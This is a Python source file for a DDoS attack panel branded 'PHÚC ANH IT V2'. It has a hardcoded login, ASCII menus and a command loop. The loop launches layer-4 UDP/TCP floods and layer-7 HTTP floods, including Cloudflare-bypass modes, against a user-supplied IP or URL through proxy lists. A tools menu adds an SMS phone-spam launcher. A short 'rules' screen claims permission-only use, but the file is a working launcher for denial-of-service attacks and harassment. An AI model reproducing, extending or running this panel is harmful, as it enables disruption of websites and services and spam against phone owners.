# PAIT | t.me/xDAXG
from operator import index
import signal
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import pystyle
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import codecs

author = "PAIT"


def ascii_vro():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''\x1b[38;5;160m
                  / **/|        
                  | == /        
                   |  |         
                   |  |         
                   |  /         
                    |/  







    ''')
    time.sleep(0.6)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''\x1b[38;5;160m



                  / **/|        
                  | == /        
                   |  |         
                   |  |         
                   |  /         
                    |/  


    ''')
    time.sleep(0.6)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''\x1b[38;5;160m







                  / **/|        
                  | == /        
                   |  |                  

    ''')
    time.sleep(0.6)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""\x1b[38;5;160m

                  _.-^^---....,,--       
              _--                  --_  
             <                        >) 
             |       \x1b[38;5;255mPHÚC ANH IT V2\x1b[38;5;160m      | 
              \._                   _./  
                 ```--. . , ; .--'''       
                       | |   |             
                    .-=||  | |=-.   
                    `-=#$%&%$#=-'   
                       | ;  :|     
              _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    os.system('cls' if os.name == 'nt' else 'clear')

def attack(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "Tassets/attack.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height // -5),
    ]
    scenes.append(Scene(effects, 21))

    # Display the first scene
    screen.play(scenes, stop_on_resize=False, repeat=False)

    # Introduce a delay (adjust the sleep duration as needed)
    time.sleep(2)

def help(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "Tassets/help.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)

def methods(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "Tassets/methods.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)

def si():
    print('Login...')
    print("")

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def menu():
        Screen.wrapper(help)
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
          \x1b[38;5;160m┌──────────────────────────────────────────────────────────┐  

                  ▄█    █▄       ▄████████  ▄█          ▄███████▄      
          \x1b[38;5;160m       ███    ███     ███    ███ ███         ███    ███      
          \x1b[38;5;160m       ███    ███     ███    █▀  ███         ███    ███      
          \x1b[38;5;160m      ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███         ███    ███      
          \x1b[38;5;160m     ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ▀█████████▀       
          \x1b[38;5;160m       ███    ███     ███    █▄  ███         ███             
          \x1b[38;5;160m       ███    ███     ███    ███ ███▌    ▄   ███             
          \x1b[38;5;160m       ███    █▀      ██████████ █████▄▄██  ▄████▀           
          \x1b[38;5;160m                                 ▀                    
          \x1b[38;5;160m└─────────────────────────────────────────────────────────┘   
          \x1b[38;5;160m          ║      DEVELOP BY PAIT | \x1b[38;5;255m@phucanhit\x1b[38;5;160m ║    
                \x1b[38;5;160m╔══════════════════════════════════════════╗
                ║          ---- Methods List! ----         ║
                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m layer4 \x1b[38;5;160m> Shows Layer 4 Methods!   ║
                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m layer7 \x1b[38;5;160m> Shows Layer 7 Methods!   ║
                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m rules  \x1b[38;5;160m> Panel Rules!             ║
                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m admin  \x1b[38;5;160m> Contact                  ║
                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m tools  \x1b[38;5;160m> Show Tools               ║
                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m update \x1b[38;5;160m> Update Script/Panel      ║
                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m clear  \x1b[38;5;160m> Clean the terminal       ║
                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m exit   \x1b[38;5;160m> Exit the panel           ║
                ╚══════════════════════════════════════════╝
""")

def layer7():
        Screen.wrapper(methods)
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
               ║          \x1b[38;5;160m       ,;::::::;     ;'         / OOOOOO0               ║
               ║          \x1b[38;5;160m██╗  ::::█████╗ ██╗   ██╗███████╗██████╗ ███████╗       ║
               ║          \x1b[38;5;160m██║.';::██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║       ║
               ║          \x1b[38;5;160m██║:::::███████║ ╚████╔╝ █████╗  ██████╔╝D000██╔╝       ║
               ║          \x1b[38;5;160m██║:::::██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗ D0██╔╝        ║
               ║          \x1b[38;5;160m███████╗██║  ██║   ██║   ███████╗██║  ██║  D██║         ║
               ║          \x1b[38;5;160m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝         ║
               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
                    ════╦════════════════════════════════════════════════╦════
                        ║              \033[32mWELCOME TO \033[33mPHÚC ANH IT\x1b[38;5;160m              ║
                        ║     \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHODS\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
                    ╔═══╩════════════════════════════════════════════════╩═══╗
                    ║       ●  STROM   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  Hmmmmmmm[\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║ 
                    ║       ●  Buff:)  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  Hmmmm1  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ║       ●  PhucAnh [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  Stack1  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ║       ●  CF-BP   [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  Stack2  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                    ╚════════════════════════════════════════════════════════╝
\033[0m""")


def tools():
        Screen.wrapper(methods)
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
               ║          \x1b[38;5;160m       ,;::::::;     ;'        / OOOOOOO                ║
               ║          \x1b[38;5;160m     ;:████████╗ ██████╗  ██████╗ ██╗OOOOO              ║
               ║          \x1b[38;5;160m   .';:╚══██╔══╝██╔═══██╗██╔═══██╗██║DOOOOOO            ║
               ║          \x1b[38;5;160m  ,::::::;██║   ██║   ██║██║   ██║██║   DOOOO           ║ 
               ║          \x1b[38;5;160m ;`::::::`██║   ██║   ██║██║   ██║██║    DOOO           ║
               ║          \x1b[38;5;160m :`:::::::██║   ╚██████╔╝╚██████╔╝███████╗ DOOO         ║
               ║          \x1b[38;5;160m ::`::::::╚═╝    ╚═════╝  ╚═════╝ ╚══════╝  DOO         ║
               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
                    ════╦════════════════════════════════════════════════╦════
                        ║                \033[33mPHÚC ANH IT TOOLS\x1b[38;5;160m               ║                
                        ║   \x1b[38;5;255mSPAMSMS\x1b[38;5;160m  |    Start a phone spam             ║
                        ║   \x1b[38;5;255mIP\x1b[38;5;160m       |    Lookup Domain/IP Infomation    ║
                        ║   \x1b[38;5;255mSCRAPE\x1b[38;5;160m   |    Get Proxy Live                 ║
                        ║   \x1b[38;5;255mCHECK\x1b[38;5;160m    |    Check for live proxy           ║
                        ║   \x1b[38;5;255mPAPING\x1b[38;5;160m   |    Get IP status in real time     ║
                        ╚════════════════════════════════════════════════╝
\033[0m""")

def layer4():
        Screen.wrapper(methods)
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
               ║          \x1b[38;5;160m       ,;::::::;     ;'         / OOOOOOO               ║
               ║          \x1b[38;5;160m██╗  ::::█████╗ ██╗   ██╗███████╗██████╗ ██╗  ██╗       ║
               ║          \x1b[38;5;160m██║.';::██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║  ██║       ║
               ║          \x1b[38;5;160m██║:::::███████║ ╚████╔╝ █████╗  ██████╔╝███████║       ║
               ║          \x1b[38;5;160m██║:::::██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗╚════██║       ║
               ║          \x1b[38;5;160m███████╗██║  ██║   ██║   ███████╗██║  ██║  DOO██║       ║
               ║          \x1b[38;5;160m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   DO╚═╝       ║
               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
                    ════╦════════════════════════════════════════════════╦════
                        ║              \033[32mWELCOME TO \033[33mPHÚC ANH IT\x1b[38;5;160m              ║
                        ║     \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHODS\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
                    ╔═══╩════════════════════════════════════════════════╩═══╗
                    ║       ●  HOME   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  STRESS  [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]        ║
                    ║       ●  UDP    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  TCP     [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]        ║
                    ╚════════════════════════════════════════════════════════╝
\033[0m""")


def rules():
    Screen.wrapper(help)
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[36m
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
""")

def get_ip_information(query):
    api_url = f"http://ip-api.com/json/{query}?fields=status,country,countryCode,regionName,city,zip,timezone,isp,org,proxy,hosting,query"
    # CODE by PAIT | facebook.com/PAITg
    try:
        response = requests.get(api_url)
        data = response.json()

        if data["status"] == "success":
            print("   \x1b[38;5;160m[ ! ] PHÚC ANH IT \x1b[38;5;255mIP \x1b[38;5;160mInformation:")
            print(f"     \x1b[38;5;160mIP: \x1b[38;5;255m{data['query']}")
            print(f"     \x1b[38;5;160mProxy:\x1b[38;5;255m{data['proxy']}")
            print(f"     \x1b[38;5;160mHosting: \x1b[38;5;255m{data['hosting']}")
            print(f"     \x1b[38;5;160mCountry: \x1b[38;5;255m{data['country']}")
            print(f"     \x1b[38;5;160mCountry Code: \x1b[38;5;255m{data['countryCode']}")
            print(f"     \x1b[38;5;160mRegion Name: \x1b[38;5;255m{data['regionName']}")
            print(f"     \x1b[38;5;160mCity: \x1b[38;5;255m{data['city']}")
            print(f"     \x1b[38;5;160mZip Code: \x1b[38;5;255m{data['zip']}")
            print(f"     \x1b[38;5;160mTimezone: \x1b[38;5;255m{data['timezone']}")
            print(f"     \x1b[38;5;160mISP: \x1b[38;5;255m{data['isp']}")
            print(f"     \x1b[38;5;160mOrganization: \x1b[38;5;255m{data['org']}")
        else:
            print(f"API Error: {data['message']}")
    except Exception as e:
        print(f"Error: {e}")
def main():
        Screen.wrapper(help)
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""              \x1b[38;5;160m                ....
              \x1b[38;5;160m              ;:::::;
              \x1b[38;5;160m            ;::::;  :;                        ________________________________
              \x1b[38;5;160m          ;:::::'    :;                     /\                               |
              \x1b[38;5;160m         ;:::::;      ;.                    \_|                              |
              \x1b[38;5;160m        ,:::::' \x1b[38;5;255m▄▄▄▄▄▄\x1b[38;5;160m ;           OOO       |  Type '\x1b[38;5;255mhelp\x1b[38;5;160m' to see them all  |
              \x1b[38;5;160m        ::::::;        ;          OOOOO      |                               |
              \x1b[38;5;160m        ;:::::;        ;         OOOOOOOO    |   ____________________________|
              \x1b[38;5;160m       ,;::::::;      ;'        / OOOOOOO     \_/____________________________/
              \x1b[38;5;160m     ;:::::::::`. ,,,;.        /  / DOOOOOO
              \x1b[38;5;160m   .';:::::::::::::::::;,     /  /     DOOOO           PHÚC ANH IT V.2
              \x1b[38;5;160m  ,::::::;::::::;;;;::::;,   /  /        DOOO
              \x1b[38;5;160m ;`::::::`'::::::;;;::::: ,#/  /          DOOO
              \x1b[38;5;160m :`:::::::`;::::::;;::: ;::#  /            DOOO
              \x1b[38;5;160m ::`:::::::`;:::::::: ;::::# /              DOO
              \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO
              \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO
              \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO
              \x1b[38;5;160m  `:::::`::::::::::::;'`:;::#                O
              \x1b[38;5;160m    `:::::`::::::::;' /  / `:#
              \x1b[38;5;160m     ::::::`:::::;'  /  /   `#")
              

       \x1b[38;5;160m    TYPE\x1b[38;5;255m  [ \x1b[38;5;255mLAYER7\x1b[38;5;255m ] \x1b[38;5;160mSHOW ALL METHODS DDOS   
\033[0m""")

        while True:
                sys.stdout.write(f"\x1b]2;[\] PHÚC ANH IT | Online Users: [∞] | Attack Sended: [∞] | Expired: [2025]\x07")
                sin = input(Fore.RED+"\x1b[38;5;160m╔═══"+Fore.RED+"\x1b[38;5;160m[""\x1b[38;5;160mroot"+Fore.RED+"@"+Fore.RED+"\x1b[38;5;160mPAIT"+Fore.RED+"\x1b[38;5;160m]"+Fore.RED+"\n\x1b[38;5;160m╚══\x1b[38;5;160m► \x1b[38;5;255m")
                sinput = sin.split(" ")[0]
                if sinput == "clear":
                        os.system ("clear")
                        main()
                if sinput == "cls" or sinput == "CLS":
                        os.system ("clear")
                        main()
                if sinput == "help" or sinput == "HELP":
                        menu()
                if sinput == "update" or sinput == "UPDATE":
                        os.system(f'python update.py')
                if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
                        layer7()
                if sinput == "tool" or sinput == "TOOL" or sinput == "TOOLS" or sinput == "tools":
                        tools()
                if sinput == "layer4" or sinput == "LAYER4" or sinput == "l4" or sinput == "L4":
                        layer4()
                if sinput == "rule" or sinput == "RULES" or sinput == "rules" or sinput == "RULE":
                        rules()
                if sinput == "exit" or sinput == "EXIT" or sinput == "kill" or sinput == "KILL" or sinput == "shut" or sinput == "SHUT":
                        sys.exit()      
                if sinput == "scrape" or sinput == "SCRAPE" or sinput == "getproxy" or sinput == "proxyget" or sinput == "g3tpr0xy" or sinput == "proxyscrape":
                        os.system(f'cd AA && python3 scrape.py')
                if sinput == "check" or sinput == "CHECK" or sinput == "checklive" or sinput == "proxycheck" or sinput == "checkproxy" or sinput == "livecheck":
                        os.system(f'cd AA && python check.py')
                if sinput == "spamsms" or sinput == "SPAMSMS":
                        os.system(f'cd AA && python spamsms.py')
                elif sinput == "ip" or sinput == "IP":
                        try:
                                query = sin.split()[1]  # Assuming the IP address is the second argument
                                get_ip_information(query)
                        except (ValueError, IndexError):
                               print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mIP <ip/adress>")
                               print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mIP 8.8.8.8')
#########LAYER-7########
                
                elif sinput == "udp" or sinput == "UDP":
                        try:
                                ip = sin.split()[1]
                                port = sin.split()[2]
                                time = sin.split()[3]
                                Screen.wrapper(attack)
                                os.system ("clear")
                                os.system(f'cd L4 && perl udp.pl {ip} {port} {time}')  
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mUDP <ip> <port> <time>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mUDP 1.1.1.1 80 120')

                elif sinput == "tcp" or sinput == "TCP":
                        try:
                                ip = sin.split()[1]
                                port = sin.split()[2]
                                thread = sin.split()[3]
                                time = sin.split()[4]
                                Screen.wrapper(attack)
                                os.system ("clear")
                                os.system(f'cd L4 && python tcp.py {ip} {port} 1000 {thread} {time}')  
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTCP <ip> <port> <thread> <time>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mTCP 1.1.1.1 80 10 120')
                
                elif sinput == "nexus" or sinput == "CF-BP":
                        try:
                                mode = sin.split()[1]
                                url = sin.split()[2]
                                time = sin.split()[3]
                                thread = sin.split()[4]
                                Screen.wrapper(attack)
                                os.system ("clear")
                                os.system(f'cd L7 && node Nexus.js {mode} {url} proxy.txt {time} 10000 {thread}')  
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mNEXUS <GET/POST> <url> <time> <thread>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mNEXUS GET example.com 120 10')
                
                elif sinput == "poseidon" or sinput == "Hmmmmmmm": #BOW
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                Screen.wrapper(attack)
                                os.system ("clear")
                                os.system(f'cd L7 && node Poseidon {url} {time} 10 proxy.txt autorate')  
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mPOSEIDON <url> <time>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mPOSEIDON https://example.com 120')

                elif sinput == "nemesis" or sinput == "PhucAnh:)":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                rate = sin.split()[3]
                                Screen.wrapper(attack)
                                os.system ("clear")
                                os.system(f'cd L7 && node Nemesis.js {url} {time} {rate} 10 proxy.txt')  
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mNEMESIS <url> <time> <rate>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mNEMESIS https://example.com 120 64')
                
                elif sinput == "pluto" or sinput == "STROM:)": #FLOOD
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                rate = sin.split()[3]
                                thread = sin.split()[4]
                                mode = sin.split()[5]
                                Screen.wrapper(attack)
                                os.system ("clear")
                                os.system(f'cd L7 && node Pluto.js {url} {time} {rate} {thread} proxy.txt {mode}')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mPLUTO <url> <time> <64-200> <12> <bypass/flood>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mPLUTO https://example.com 120 64 12 bypass')
                 
                elif sinput == "HOME" or sinput == "home":
                        try:
                                url = sin.split()[1]
                                port = sin.split()[2]
                                time = sin.split()[3]
                                Screen.wrapper(attack)
                                os.system(f'cd L4 && perl home.pl {url} {port} 65500 {time}')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHOME <ip> <port> <time>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHOME 1.1.1.1 433')

                elif sinput == "inferno" or sinput == "Stack1":
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                rate = sin.split()[3]
                                Screen.wrapper(attack)
                                os.system(f'cd L7 && node Inferno.js {url} {time} {rate} 10 socks4.txt')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mINFERNO <url> <time> <rate>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mINFERNO https://example.com 120 64')

                elif sinput == "zenith" or sinput == "Stack2": # KILLER
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                Screen.wrapper(attack)
                                os.system(f'cd L7 && node Zenith.js {url} {time} 100 10 proxy.txt')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mZENITH <url> <time>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mZENITH https://example.com 120')
    
                elif sinput == "HULK" or sinput == "hulk":
                        try:
                                url = sin.split()[1]
                                method = sin.split()[2]
                                Screen.wrapper(attack)
                                os.system(f'cd L7 && go run HULK.go -site {url} {method} nil')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHULK <url> <GET/POST>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mHULK https://example.com GET')

                elif sinput == "erebus" or sinput == "Hmmmm1": 
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                Screen.wrapper(attack)
                                os.system(f'cd L7 && node Erebus.js {url} {time} 80 10 proxy.txt')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mEREBUS <url> <time>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mEREBUS https://example.com 120')

                elif sinput == "paping" or sinput == "PAPING":
                        try:
                                ip = sin.split()[1]
                                port = sin.split()[2]
                                Screen.wrapper(attack)
                                os.system(f'cd AA && python paping.py {ip} {port}')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mPAPING <ip> <port>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mPAPING 1.1.1.1 80')

                elif sinput == "STRESS" or sinput == "stress":
                        try:
                                url = sin.split()[1]
                                port = sin.split()[2]
                                time = sin.split()[3]
                                Screen.wrapper(attack)
                                os.system(f'cd L4 && go run STRESS.go {url} {port} 3 2000 {time} {time}')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSTRESS <url> <port> <time>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mSTRESS https://example.com 443 120')

                elif sinput == "glaxia" or sinput == "GLAXIA": #UAMCFL
                        try:
                                url = sin.split()[1]
                                time = sin.split()[2]
                                Screen.wrapper(attack)
                                os.system(f'cd L7 && node Glaxia.js {url} {time} 64 10 proxy.txt')
                        except (ValueError, IndexError):
                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mUAMCFL <url> <time>")
                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mUAMCFL https://example.com 120')

                else:
                        try:
                                cmd=sin.split()[0]
                                excluded_keywords = ["cls", "help", "HELP", "RULES", "rules", "rule", "RULE", "kill", "KILL", "exit", "EXIT", "l4", "L4", "layer4", "LAYER4", "l7", "L7", "layer7", "LAYER7", "tool", "tools", "TOOL", "TOOLS", "shut", "SHUT", "scrape", "SCRAPE", "checkproxy", "update", "UPDATE", "check"]
                                
                                if cmd not in excluded_keywords:
                                  print(" \x1b[38;5;160m[ ! ] Command : [ \x1b[38;5;255m"+cmd+" \x1b[38;5;160m] Not Found\n [ > ] Use '\x1b[38;5;255mhelp\x1b[38;5;160m' to see all commands.")
                        except (ValueError, IndexError):
                             pass             
    


def login():
    os.system('cls' if os.name == 'nt' else 'clear')
    user = "PhucAnhIT"
    passwd = "PhucAnhIT"
    username = input("\x1b[38;5;255m\x1b[38;5;255m[ ☠️  ] \x1b[38;5;160m| \x1b[38;5;255mUsername: \x1b[38;5;255m")
    password = getpass.getpass(prompt='\x1b[38;5;255m[ ☠️  ] \x1b[38;5;160m| \x1b[38;5;255mPassword: \x1b[38;5;255m')
    if username != user or password != passwd:
        print("")
        print("⚡ \x1b[38;5;255mWrong User/Password | EXITING\x1b[38;5;160m")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ \x1b[38;5;160mWelcome To \x1b[38;5;255mPHÚC ANH IT\x1b[38;5;160m [\x1b[38;5;255mv2\x1b[38;5;160m]")
        time.sleep(1)
        ascii_vro()
        main()

login()
